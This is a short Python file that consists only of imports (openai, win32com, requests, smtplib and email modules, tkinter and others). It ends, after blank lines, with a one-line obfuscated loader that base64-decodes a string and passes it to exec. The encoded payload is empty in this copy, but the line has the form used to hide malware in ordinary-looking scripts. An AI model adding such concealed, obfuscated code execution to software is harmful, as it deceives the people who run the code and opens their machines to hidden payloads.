import openai
import win32com.client
import webbrowser
import requests
import time
import os
import shutil
from bs4 import BeautifulSoup
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import re
import tkinter as tk
from tkinter import messagebox
import random
import threading



import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('')))
